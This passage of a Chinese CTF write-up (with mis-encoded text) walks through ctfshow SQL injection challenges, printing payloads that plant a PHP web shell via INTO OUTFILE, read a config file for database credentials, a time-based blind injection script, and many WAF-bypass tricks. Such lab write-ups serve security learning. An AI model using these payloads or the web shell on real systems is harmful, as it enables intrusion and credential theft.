<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/[\x00-\x7f]/i&#x27;</span>, json_encode(<span class="hljs-variable">$ret</span>)))&#123;<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&#x27;æŸ¥è¯¢æˆåŠŸ&#x27;</span>;<br>    &#125;<br>      <br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p><strong>è¿‡æ»¤äº† ascii 0-127ï¼Œå°è¯•ä»å…¶ä»–ä¿¡é“å°†æ•°æ®å¸¦å‡ºï¼Œåˆ©ç”¨into outfileæ¥å®ç°æ–‡ä»¶çš„è¾“å‡º</strong></p>
<p><strong>è¿˜å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾æ‰€ä»¥å¸ƒå°”ç›²æ³¨ä¸è¡Œ</strong></p>
<p>payloadï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27; into outfile &#x27;</span>/<span class="hljs-keyword">var</span>/www/html/mixbp.php<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">ç„¶åä½¿ç”¨èšå‰‘è¿æ¥</span><br><span class="hljs-string">http://c3041e53-3cc6-410a-9f33-e55e57ee7b6b.challenge.ctf.show/mixbp.php	å¯†ç ä¸º1</span><br><span class="hljs-string">è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹æ­£åˆ™äº†ã€‚ç„¶åå†æ¬¡æ³¨å…¥å³å¯ã€‚</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">æˆ–è€…postä¼ å‚1=system(&quot;tac ./api/config.php&quot;);å¾—åˆ°æ•°æ®åº“å¯†ç ï¼Œç„¶åè¿æ¥æ•°æ®åº“ï¼Œä½¿ç”¨selectè¯­å¥æŸ¥æ‰¾flag</span><br></code></pre></td></tr></table></figure>

<p>æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br>import <span class="hljs-built_in">time</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span> :<br>    url = <span class="hljs-string">&#x27;http://2a8873c8-47c9-4783-b056-ef2c97bdb9cb.challenge.ctf.show/api/?id=&#x27;</span><br>    <span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>            payload = f<span class="hljs-string">&#x27;1\&#x27; and if(ascii(substr((select group_concat(database()) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(1)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment">#payload = f&#x27;1\&#x27; and if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2)) --+&#x27;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            stime=<span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<br>            r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()-stime&lt;<span class="hljs-number">1</span>:<br>                low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>            <span class="hljs-built_in">result</span> += chr(low)<br>        <span class="hljs-keyword">else</span>:<br>            break<br>        print(<span class="hljs-built_in">result</span>)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-176ï¼ˆå¤§å°å†™ç»•è¿‡selectè¿‡æ»¤ï¼‰"><a href="#web-176ï¼ˆå¤§å°å†™ç»•è¿‡selectè¿‡æ»¤ï¼‰" class="headerlink" title="web-176ï¼ˆå¤§å°å†™ç»•è¿‡selectè¿‡æ»¤ï¼‰"></a>web-176ï¼ˆå¤§å°å†™ç»•è¿‡selectè¿‡æ»¤ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-comment">//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span><br>  &#125;<br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼šè¿™é‡Œè¿‡æ»¤äº†selectï¼Œå¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œä½†æ˜¯æ²¡å¿…è¦ç”¨è”åˆæŸ¥è¯¢ï¼Œç›´æ¥<code>1&#39; or 1=1 --+</code>å³å¯</p>
<p>payloadï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ä¸‡èƒ½å¯†ç <br><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 --+</span><br><span class="hljs-string">æˆ–è€…</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">ä½¿ç”¨unionè”åˆæŸ¥è¯¢å¹¶ç”¨å¤§å°å†™ç»•è¿‡selectè¿‡æ»¤</span><br><span class="hljs-string">//æµ‹å‡ºè¡¨æœ‰3åˆ—</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br>//çˆ†å‡ºåº“åä¸ºctfshow_web<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union Select 1,2,database() --+	</span><br><span class="hljs-string">//çˆ†å‡ºè¡¨åctfshow_user</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;ctfshow_web&#x27;</span> <span class="hljs-comment">--+	</span><br>//çˆ†å‡ºåˆ—åid,username,<span class="hljs-keyword">password</span><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union Select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>ctfshow_user<span class="hljs-string">&#x27; --+	</span><br><span class="hljs-string">//æ ¹æ®åˆ—åçˆ†å‡ºæ•°æ®å¾—åˆ°flag</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">Select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">--+	</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-177ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ-ã€-09ï¼‰ï¼‰"><a href="#web-177ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ-ã€-09ï¼‰ï¼‰" class="headerlink" title="web-177ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ&#x2F;**&#x2F;ã€%09ï¼‰ï¼‰"></a>web-177ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ&#x2F;**&#x2F;ã€%09ï¼‰ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-comment">//ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º</span><br>  &#125;<br>     <br></code></pre></td></tr></table></figure>

<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>æœ‰è¿‡æ»¤çš„å­—ç¬¦å‹æ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œå¯¹ç©ºæ ¼å’Œ<code>--+</code>æœ‰è¿‡æ»¤ï¼Œç”¨ %09æˆ–è€…&#x2F;**&#x2F;æ³¨é‡Šç¬¦ç»•è¿‡ç©ºæ ¼è¿‡æ»¤ï¼Œç”¨%23å³#ï¼ˆè¿™é‡Œåªèƒ½ç”¨%23ï¼‰ç»•è¿‡<code>--+</code>è¿‡æ»¤ã€‚</p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs haml">å‰é¢çˆ†åº“åçˆ†è¡¨åçˆ†åˆ—åé»˜è®¤æµç¨‹<br>-<span class="language-ruby"><span class="hljs-number">1</span><span class="hljs-string">&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;</span>flag<span class="hljs-string">&#x27;%23</span></span><br><br>-<span class="language-ruby"><span class="hljs-string">1&#x27;</span>/**<span class="hljs-regexp">/union/</span>**<span class="hljs-regexp">/select/</span>**<span class="hljs-regexp">/1,2,password/</span>**<span class="hljs-regexp">/from/</span>**<span class="hljs-regexp">/ctfshow_user/</span>**<span class="hljs-regexp">/where/</span>**<span class="hljs-regexp">/username=&#x27;flag&#x27;%23</span></span><br><br># ()ä¸­çš„ç©ºæ ¼ä¹Ÿå¯ç”¨ ` æ›¿ä»£  æŸäº›æƒ…å†µä¸‹<br>-<span class="language-ruby"><span class="hljs-regexp">1&#x27;union/</span>**<span class="hljs-regexp">/select/</span>**<span class="hljs-regexp">/1,2,(select`password`from`ctfshow_user`where`username`=&#x27;flag&#x27;)%23</span></span><br><br>    <br>    <br>å¯æ›¿ä»£ç©ºæ ¼<br><span class="hljs-tag">%<span class="hljs-selector-tag">0a</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0b</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0c</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">0d</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">09</span></span><br><span class="hljs-tag">%<span class="hljs-selector-tag">a0</span>(åœ¨ç‰¹å®šå­—ç¬¦é›†æ‰èƒ½åˆ©ç”¨)</span><br>ä»¥ä¸Šå‡ä¸ºURLç¼–ç <br><span class="hljs-comment"></span><br><span class="hljs-comment">/**/ç»„åˆ</span><br>æ‹¬å·<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span>ä»£æ›¿æ³¨é‡Šç¬¦ -- <br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-178ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ-0bæ¢è¡Œç¬¦ã€-09ï¼‰ï¼‰"><a href="#web-178ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ-0bæ¢è¡Œç¬¦ã€-09ï¼‰ï¼‰" class="headerlink" title="web-178ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ%0bæ¢è¡Œç¬¦ã€%09ï¼‰ï¼‰"></a>web-178ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ%0bæ¢è¡Œç¬¦ã€%09ï¼‰ï¼‰</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<p>è¿‡æ»¤æ‰äº†&#x2F;**&#x2F; # ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨&#x2F;**&#x2F; æ¥ä»£æ›¿ç©ºæ ¼äº†</p>
<p><strong>å¯ä»¥ç”¨æ¢è¡Œç¬¦%0bæˆ–è€…%09æ¥ä»£æ›¿ç©ºæ ¼</strong></p>
<p>payloadï¼š</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%09</span>union<span class="hljs-variable">%09</span><span class="hljs-keyword">select</span><span class="hljs-variable">%091</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%09</span>from<span class="hljs-variable">%09</span>ctfshow_user<span class="hljs-variable">%09</span>where<span class="hljs-variable">%09</span>username<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%23</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>bunion<span class="hljs-variable">%0</span>bselect<span class="hljs-variable">%0</span>b<span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>bfrom<span class="hljs-variable">%0</span>bctfshow_user<span class="hljs-variable">%0</span>bwhere<span class="hljs-variable">%0</span>busername<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%23</span><br><br>ä¸‡èƒ½å¯†ç ä¸€æ ·å¯ä»¥ <br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>aor<span class="hljs-variable">%0</span>a<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="we-179ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ-0cï¼‰ï¼‰"><a href="#we-179ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ-0cï¼‰ï¼‰" class="headerlink" title="we-179ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ%0cï¼‰ï¼‰"></a>we-179ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ï¼ˆ%0cï¼‰ï¼‰</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<p>æœ‰è¿‡æ»¤çš„å­—ç¬¦å‹æ³¨å…¥ï¼Œå’Œä¸Šä¸Šé¢˜å·®ä¸å¤šï¼Œå¢åŠ äº†å¯¹ <code>%09 %0a %0b %0d</code> çš„è¿‡æ»¤ï¼Œ%0c å¯ä»¥ç”¨ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cunion<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%0</span>cwhere<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%23</span><br><br>()ä¸­çš„ç©ºæ ¼å¯ç”¨ ` æ›¿ä»£ï¼Œè¿™æ ·æ›´ç®€å•<br><span class="hljs-number">-1</span>&#x27;union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span>`password`from`ctfshow_user`where`username`<span class="hljs-operator">=</span>&#x27;flag&#x27;)<span class="hljs-variable">%23</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-180ï¼ˆ-23-æ³¨é‡Šç¬¦è¿‡æ»¤ç»•è¿‡ï¼‰"><a href="#web-180ï¼ˆ-23-æ³¨é‡Šç¬¦è¿‡æ»¤ç»•è¿‡ï¼‰" class="headerlink" title="web-180ï¼ˆ#(%23)æ³¨é‡Šç¬¦è¿‡æ»¤ç»•è¿‡ï¼‰"></a>web-180ï¼ˆ#(%23)æ³¨é‡Šç¬¦è¿‡æ»¤ç»•è¿‡ï¼‰</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<p>å¢åŠ äº†å¯¹ <code>#(%23)</code> çš„è¿‡æ»¤ï¼Œè¿™é‡Œä½¿ç”¨ â€“ (â€“ååŠ ä¸ªç©ºæ ¼) ç»•è¿‡ã€‚</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># é¿å¼€ç»“å°¾æ³¨é‡Š<br><span class="hljs-number">-1</span>&#x27;union<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span>`password`from`ctfshow_user`where`username`<span class="hljs-operator">=</span>&#x27;flag&#x27;)<span class="hljs-punctuation">,</span>&#x27;<span class="hljs-number">2</span><br>#æœ‰ç»“å°¾æ³¨é‡Š   **<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>**<br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cunion<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>cpassword<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%0</span>cwhere<span class="hljs-variable">%0</span>cusername<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>&#x27;flag&#x27;)<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cunion<span class="hljs-variable">%0</span>cselect<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>password<span class="hljs-variable">%0</span>cfrom<span class="hljs-variable">%0</span>cctfshow_user<span class="hljs-variable">%0</span>cwhere<span class="hljs-variable">%0</span>cusername<span class="hljs-operator">=</span>&#x27;flag&#x27;<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br><br><span class="hljs-number">-1</span>&#x27;<span class="hljs-variable">%0</span>cor<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%0</span><span class="hljs-keyword">c</span>--<span class="hljs-variable">%0</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-181ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ã€é€»è¾‘è¿ç®—ä¼˜å…ˆçº§ï¼‰"><a href="#web-181ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ã€é€»è¾‘è¿ç®—ä¼˜å…ˆçº§ï¼‰" class="headerlink" title="web-181ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ã€é€»è¾‘è¿ç®—ä¼˜å…ˆçº§ï¼‰"></a>web-181ï¼ˆç©ºæ ¼è¿‡æ»¤ç»•è¿‡ã€é€»è¾‘è¿ç®—ä¼˜å…ˆçº§ï¼‰</h2><p>æŸ¥è¯¢è¯­å¥</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·<br>$sql = &quot;<span class="hljs-keyword">select</span> id,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> id = <span class="hljs-string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="hljs-string">&#x27;].&quot;&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>;&quot;;<br>      <br></code></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |<span class="hljs-string">\*</span>|<span class="hljs-string">\x09</span>|<span class="hljs-string">\x0a</span>|<span class="hljs-string">\x0b</span>|<span class="hljs-string">\x0c</span>|<span class="hljs-string">\x00</span>|<span class="hljs-string">\x0d</span>|<span class="hljs-string">\xa0</span>|<span class="hljs-string">\x23</span>|<span class="hljs-string">\#</span>|<span class="hljs-string">file</span>|<span class="hljs-string">into</span>|<span class="hljs-string">select/i&#x27;, $str);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">      </span><br></code></pre></td></tr></table></figure>

<p><strong>æ²¡æœ‰ç©ºæ ¼å’Œ select å¯ä»¥ç”¨ï¼Œè¿™é‡Œåˆ©ç”¨é€»è¾‘è¿ç®—çš„ä¼˜å…ˆçº§æ„é€  and è¯­å¥ï¼Œç»•è¿‡æŸ¥è¯¢è¯­å¥å‰é¢çš„ username !&#x3D; flagï¼Œä¸”ä¸èƒ½å«æœ‰ç©ºæ ¼</strong></p>
<p><strong>and&gt;or</strong><br><strong>å…³äºä¼˜å…ˆçº§é—®é¢˜å°±è·ŸåŠ å‡å·ä¸ä¹˜é™¤å·ä¸€æ ·ï¼Œandå…ˆè¿ç®—ï¼Œé‚£ä¹ˆandçš„è¿ç®—ç»“æœè¿‡ç¨‹å¦‚ä½•è§£é‡Šï¼šéœ€è¦åŒæ—¶æ»¡è¶³ä¸¤è¾¹çš„æ¡ä»¶æ‰ä¼šè¿”å›trueé‚£ä¹ˆè¿™é‡Œå°±æ˜¯è®©ç¬¬ä¸€ä¸ªandè¯­å¥è¿”å›falseè®©åé¢çš„andè¯­å¥æ¥åšåˆ°çŸ¥è¡Œçš„æ•ˆæœ</strong></p>
<p>payloadï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">0<span class="hljs-string">&#x27;or(id=26)and&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>andçš„ä¼˜å…ˆçº§æ¯”orè¦é«˜ï¼Œæ•…æ³¨å…¥åçš„è¯­å¥å˜æˆäº†<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">id</span>,username,password frpm ctfshow_user <span class="hljs-built_in">where</span> username !=<span class="hljs-string">&#x27;flag&#x27;</span> and <span class="hljs-built_in">id</span> = <span class="hljs-string">&#x27;0&#x27;</span>or(<span class="hljs-built_in">id</span>=26)and<span 